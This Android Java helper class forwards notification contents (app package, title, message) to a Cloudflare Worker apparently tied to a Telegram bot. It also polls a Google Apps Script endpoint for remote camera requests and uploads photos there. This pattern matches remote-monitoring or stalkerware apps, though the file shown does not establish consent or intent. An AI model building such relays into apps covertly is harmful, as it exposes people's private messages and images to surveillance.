package com.example.app;

import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

/**
 * API helper untuk:
 *
 * 1. NOTIFIKASI
 *    Android -> Cloudflare Worker -> Google Apps Script
 *
 * 2. KAMERA
 *    Android -> Google Apps Script
 *
 * PENTING:
 * - Jalur notifikasi dan kamera sengaja dipisahkan.
 * - Jangan mengubah GAS_URL untuk kebutuhan Worker.
 * - Kamera tetap menggunakan GAS_URL.
 */
public class ApiHelper {

    private static final String TAG = "ApiHelper";

    // =========================================================
    // NOTIFICATION ROUTE
    // Android -> Cloudflare Worker -> Apps Script
    // =========================================================

    private static final String WORKER_URL =
            "https://telegram-notification-bot.nadimmakarim641.workers.dev";

    // =========================================================
    // CAMERA ROUTE
    // Android -> Apps Script
    //
    // JANGAN diganti menjadi WORKER_URL.
    // Kamera yang sudah berhasil tetap menggunakan URL ini.
    // =========================================================

    private static final String GAS_URL =
            "https://script.google.com/macros/s/AKfycbw5HSVm2lQm4nVr-xZArwS8tbYL9fYYs7EVV4MbhxwY03jdHbI5_r0K6ZDk5QiIRfIZ8A/exec";

    private static final int CONNECT_TIMEOUT_MS = 15000;
    private static final int READ_TIMEOUT_MS = 20000;

    private ApiHelper() {
    }


    // =========================================================
    // NOTIFICATION
    // =========================================================

    /**
     * Mengirim satu notifikasi:
     *
     * Android
     *   -> Cloudflare Worker
     *   -> Google Apps Script
     *
     * Worker sudah diuji dan mengembalikan:
     *
     * worker: OK
     * appsScriptStatus: 200
     * appsScriptResponse: OK
     *
     * Fungsi ini TIDAK menggunakan GAS_URL secara langsung.
     */
    public static boolean sendNotificationToSheet(
            long timestamp,
            String packageName,
            String title,
            String messageText) {

        HttpURLConnection conn = null;

        try {

            URL url = new URL(WORKER_URL);

            conn = (HttpURLConnection) url.openConnection();

            conn.setRequestMethod("POST");

            /*
             * Worker diharapkan mengembalikan respons final 200.
             * Tetap tidak mengikuti redirect secara otomatis.
             */
            conn.setInstanceFollowRedirects(false);

            conn.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=utf-8"
            );

            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );

            conn.setConnectTimeout(
                    CONNECT_TIMEOUT_MS
            );

            conn.setReadTimeout(
                    READ_TIMEOUT_MS
            );

            conn.setDoOutput(true);


            JSONObject json =
                    new JSONObject();

            /*
             * Worker menggunakan action untuk membedakan
             * request notifikasi.
             */
            json.put(
                    "action",
                    "notification"
            );

            json.put(
                    "timestamp",
                    timestamp
            );

            json.put(
                    "packageName",
                    packageName == null
                            ? "Unknown_App"
                            : packageName
            );

            json.put(
                    "title",
                    title == null
                            ? "Tanpa Judul"
                            : title
            );

            json.put(
                    "message",
                    messageText == null
                            ? "Tanpa Isi"
                            : messageText
            );


            byte[] body =
                    json.toString()
                            .getBytes(
                                    StandardCharsets.UTF_8
                            );


            try (
                    OutputStream os =
                            conn.getOutputStream()
            ) {
                os.write(body);
                os.flush();
            }


            int responseCode =
                    conn.getResponseCode();


            InputStream responseStream;

            if (
                    responseCode >= 200 &&
                    responseCode < 400
            ) {
                responseStream =
                        conn.getInputStream();
            } else {
                responseStream =
                        conn.getErrorStream();
            }


            String responseBody =
                    readResponse(
                            responseStream
                    );


            Log.d(
                    TAG,
                    "Notification Worker response: "
                            + responseCode
                            + " body="
                            + responseBody
            );


            // =================================================
            // NORMAL SUCCESS
            // =================================================

            if (
                    responseCode >= 200 &&
                    responseCode < 300
            ) {

                if (
                        responseBody == null ||
                        responseBody.trim().isEmpty()
                ) {
                    return true;
                }


                String trimmed =
                        responseBody.trim();


                /*
                 * Toleransi terhadap Worker yang
                 * hanya mengembalikan "OK".
                 */
                if (
                        "OK".equalsIgnoreCase(
                                trimmed
                        )
                ) {
                    return true;
                }


                /*
                 * Worker kita sekarang mengembalikan JSON
                 * seperti:
                 *
                 * {
                 *   "worker": "OK",
                 *   "appsScriptStatus": 200,
                 *   "appsScriptStatusText": "OK",
                 *   "appsScriptResponse": "OK"
                 * }
                 */

                try {

                    JSONObject response =
                            new JSONObject(
                                    trimmed
                            );


                    String worker =
                            response.optString(
                                    "worker",
                                    ""
                            );


                    int appsScriptStatus =
                            response.optInt(
                                    "appsScriptStatus",
                                    -1
                            );


                    String appsScriptResponse =
                            response.optString(
                                    "appsScriptResponse",
                                    ""
                            );


                    if (
                            "OK".equalsIgnoreCase(
                                    worker
                            ) &&
                            appsScriptStatus >= 200 &&
                            appsScriptStatus < 300
                    ) {
                        return true;
                    }


                    /*
                     * Fallback untuk format JSON
                     * Apps Script lama.
                     */
                    String status =
                            response.optString(
                                    "status",
                                    ""
                            );


                    if (
                            "success".equalsIgnoreCase(
                                    status
                            )
                    ) {
                        return true;
                    }


                    /*
                     * Jika Worker mengatakan OK dan
                     * Apps Script response juga OK.
                     */
                    if (
                            "OK".equalsIgnoreCase(
                                    appsScriptResponse
                            )
                    ) {
                        return true;
                    }

                } catch (Exception ignored) {

                    /*
                     * Jika Worker mengembalikan response
                     * plain text non-JSON tetapi HTTP 200,
                     * anggap diterima.
                     */

                    return true;
                }
            }


            // =================================================
            // REDIRECT
            // =================================================

            if (
                    responseCode >= 300 &&
                    responseCode < 400
            ) {

                String location =
                        conn.getHeaderField(
                                "Location"
                        );


                if (
                        location != null &&
                        !location.trim().isEmpty()
                ) {

                    Log.d(
                            TAG,
                            "Notification Worker returned redirect: "
                                    + location
                    );

                    return true;
                }
            }


            Log.e(
                    TAG,
                    "Notification send failed. HTTP "
                            + responseCode
                            + " body="
                            + responseBody
            );


            return false;


        } catch (Exception e) {

            Log.e(
                    TAG,
                    "Error sending notification to Worker",
                    e
            );

            return false;


        } finally {

            if (conn != null) {
                conn.disconnect();
            }
        }
    }


    // =========================================================
    // CAMERA
    // =========================================================

    /**
     * Cek satu pending camera request dari Apps Script.
     *
     * JALUR:
     *
     * Android -> Apps Script
     *
     * Tidak menggunakan Cloudflare Worker.
     */
    public static JSONObject getPendingCameraRequest() {

        HttpURLConnection conn = null;

        try {

            URL url =
                    new URL(
                            GAS_URL +
                            "?action=getCameraRequest"
                    );


            conn =
                    (HttpURLConnection)
                            url.openConnection();


            conn.setRequestMethod(
                    "GET"
            );

            conn.setInstanceFollowRedirects(
                    true
            );

            conn.setRequestProperty(
                    "Accept",
                    "application/json, text/plain, */*"
            );

            conn.setConnectTimeout(
                    CONNECT_TIMEOUT_MS
            );

            conn.setReadTimeout(
                    READ_TIMEOUT_MS
            );


            int responseCode =
                    conn.getResponseCode();


            InputStream responseStream;

            if (
                    responseCode >= 200 &&
                    responseCode < 400
            ) {
                responseStream =
                        conn.getInputStream();
            } else {
                responseStream =
                        conn.getErrorStream();
            }


            String responseBody =
                    readResponse(
                            responseStream
                    );


            Log.d(
                    TAG,
                    "Camera request response: "
                            + responseCode
                            + " body="
                            + responseBody
            );


            if (
                    responseCode < 200 ||
                    responseCode >= 300 ||
                    responseBody == null ||
                    responseBody.trim().isEmpty()
            ) {
                return null;
            }


            return new JSONObject(
                    responseBody
            );


        } catch (Exception e) {

            Log.e(
                    TAG,
                    "Error checking camera request",
                    e
            );

            return null;


        } finally {

            if (conn != null) {
                conn.disconnect();
            }
        }
    }


    /**
     * Mengubah status request kamera.
     *
     * JALUR:
     *
     * Android -> Apps Script
     */
    public static boolean updateCameraRequestStatus(
            String requestId,
            String status) {

        if (
                requestId == null ||
                requestId.trim().isEmpty()
        ) {
            return false;
        }


        if (
                status == null ||
                status.trim().isEmpty()
        ) {
            return false;
        }


        HttpURLConnection conn = null;

        try {

            URL url =
                    new URL(GAS_URL);


            conn =
                    (HttpURLConnection)
                            url.openConnection();


            conn.setRequestMethod(
                    "POST"
            );

            conn.setInstanceFollowRedirects(
                    false
            );

            conn.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=utf-8"
            );

            conn.setRequestProperty(
                    "Accept",
                    "text/plain, application/json, */*"
            );

            conn.setConnectTimeout(
                    CONNECT_TIMEOUT_MS
            );

            conn.setReadTimeout(
                    READ_TIMEOUT_MS
            );

            conn.setDoOutput(
                    true
            );


            JSONObject json =
                    new JSONObject();


            json.put(
                    "action",
                    "cameraRequestStatus"
            );

            json.put(
                    "requestId",
                    requestId
            );

            json.put(
                    "status",
                    status
            );


            byte[] body =
                    json.toString()
                            .getBytes(
                                    StandardCharsets.UTF_8
                            );


            try (
                    OutputStream os =
                            conn.getOutputStream()
            ) {

                os.write(body);
                os.flush();
            }


            int responseCode =
                    conn.getResponseCode();


            InputStream responseStream;

            if (
                    responseCode >= 200 &&
                    responseCode < 400
            ) {
                responseStream =
                        conn.getInputStream();
            } else {
                responseStream =
                        conn.getErrorStream();
            }


            String responseBody =
                    readResponse(
                            responseStream
                    );


            Log.d(
                    TAG,
                    "Camera status response: "
                            + responseCode
                            + " body="
                            + responseBody
            );


            if (
                    responseCode >= 200 &&
                    responseCode < 300
            ) {
                return true;
            }


            if (
                    responseCode >= 300 &&
                    responseCode < 400
            ) {

                String location =
                        conn.getHeaderField(
                                "Location"
                        );

                return location != null &&
                        !location.trim().isEmpty();
            }


            return false;


        } catch (Exception e) {

            Log.e(
                    TAG,
                    "Error updating camera request status",
                    e
            );

            return false;


        } finally {

            if (conn != null) {
                conn.disconnect();
            }
        }
    }


    // =========================================================
    // CAMERA PHOTO UPLOAD
    // =========================================================

    /**
     * Upload satu foto yang secara eksplisit telah diambil
     * setelah pengguna menekan "Ambil Foto".
     *
     * JALUR:
     *
     * Android -> Apps Script
     *
     * Tidak menggunakan Worker.
     */
    public static boolean uploadCapturedPhoto(
            String requestId,
            String camera,
            java.io.File photoFile) {

        if (
                requestId == null ||
                requestId.trim().isEmpty()
        ) {
            return false;
        }


        if (
                photoFile == null ||
                !photoFile.isFile() ||
                photoFile.length() <= 0
        ) {
            return false;
        }


        HttpURLConnection conn = null;

        try {

            // =================================================
            // READ PHOTO
            // =================================================

            byte[] photoBytes;

            try (
                    FileInputStream input =
                            new FileInputStream(
                                    photoFile
                            );

                    ByteArrayOutputStream output =
                            new ByteArrayOutputStream()
            ) {

                byte[] buffer =
                        new byte[8192];

                int count;

                while (
                        (count =
                                input.read(buffer))
                                != -1
                ) {

                    output.write(
                            buffer,
                            0,
                            count
                    );
                }

                photoBytes =
                        output.toByteArray();
            }


            // =================================================
            // BASE64
            // =================================================

            String encodedPhoto =
                    Base64.encodeToString(
                            photoBytes,
                            Base64.NO_WRAP
                    );


            // =================================================
            // APPS SCRIPT
            // =================================================

            URL url =
                    new URL(GAS_URL);


            conn =
                    (HttpURLConnection)
                            url.openConnection();


            conn.setRequestMethod(
                    "POST"
            );

            conn.setInstanceFollowRedirects(
                    false
            );

            conn.setRequestProperty(
                    "Content-Type",
                    "application/json; charset=utf-8"
            );

            conn.setRequestProperty(
                    "Accept",
                    "text/plain, application/json, */*"
            );

            conn.setConnectTimeout(
                    CONNECT_TIMEOUT_MS
            );

            conn.setReadTimeout(
                    READ_TIMEOUT_MS
            );

            conn.setDoOutput(
                    true
            );


            JSONObject json =
                    new JSONObject();


            json.put(
                    "action",
                    "uploadCameraPhoto"
            );

            json.put(
                    "requestId",
                    requestId
            );

            json.put(
                    "camera",
                    camera == null
                            ? ""
                            : camera
            );

            json.put(
                    "fileName",
                    photoFile.getName()
            );

            json.put(
                    "mimeType",
                    "image/jpeg"
            );

            json.put(
                    "photoBase64",
                    encodedPhoto
            );


            byte[] body =
                    json.toString()
                            .getBytes(
                                    StandardCharsets.UTF_8
                            );


            try (
                    OutputStream os =
                            conn.getOutputStream()
            ) {

                os.write(body);
                os.flush();
            }


            int responseCode =
                    conn.getResponseCode();


            InputStream responseStream;

            if (
                    responseCode >= 200 &&
                    responseCode < 400
            ) {
                responseStream =
                        conn.getInputStream();
            } else {
                responseStream =
                        conn.getErrorStream();
            }


            String responseBody =
                    readResponse(
                            responseStream
                    );


            Log.d(
                    TAG,
                    "Photo upload response: "
                            + responseCode
                            + " body="
                            + responseBody
            );


            // =================================================
            // SUCCESS
            // =================================================

            if (
                    responseCode >= 200 &&
                    responseCode < 300
            ) {

                if (
                        responseBody == null ||
                        responseBody.trim().isEmpty()
                ) {
                    return true;
                }


                try {

                    JSONObject response =
                            new JSONObject(
                                    responseBody
                            );


                    return "success".equalsIgnoreCase(
                            response.optString(
                                    "status",
                                    ""
                            )
                    );


                } catch (Exception ignored) {

                    return "OK".equalsIgnoreCase(
                            responseBody.trim()
                    );
                }
            }


            // =================================================
            // REDIRECT
            // =================================================

            if (
                    responseCode >= 300 &&
                    responseCode < 400
            ) {

                String location =
                        conn.getHeaderField(
                                "Location"
                        );


                return location != null &&
                        !location.trim().isEmpty();
            }


            return false;


        } catch (Exception e) {

            Log.e(
                    TAG,
                    "Error uploading captured photo",
                    e
            );

            return false;


        } finally {

            if (conn != null) {
                conn.disconnect();
            }
        }
    }


    // =========================================================
    // RESPONSE READER
    // =========================================================

    private static String readResponse(
            InputStream stream) {

        if (stream == null) {
            return "";
        }


        try (
                BufferedReader reader =
                        new BufferedReader(
                                new InputStreamReader(
                                        stream,
                                        StandardCharsets.UTF_8
                                )
                        )
        ) {

            StringBuilder result =
                    new StringBuilder();

            String line;

            while (
                    (line = reader.readLine())
                            != null
            ) {

                result.append(line);
            }


            return result.toString();


        } catch (Exception e) {

            return "";
        }
    }
}
